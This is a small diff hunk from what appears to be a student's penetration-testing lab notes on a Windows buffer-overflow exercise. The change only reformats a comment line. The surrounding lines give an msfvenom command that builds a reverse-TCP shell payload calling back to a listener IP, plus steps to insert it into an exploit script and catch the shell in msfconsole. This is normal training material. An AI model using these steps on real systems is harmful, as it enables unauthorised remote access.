@@ -98,7 +98,7 @@ OR
 LINOPS > cd /home/student/Downloads/winsploit 
 vim winbuff.py (Change IP to victim)
 msfvenom -p windows/shell/reverse_tcp lhost=10.50.31.135 lport=6969 -b "\x00" -f python
-                   !! (LHOST IS LINOPS ip) ^
+!! (LHOST IS LINOPS ip) ^
 ## Insert generated payload into script !! buf = b"" not neccessary
 
 msfconsole
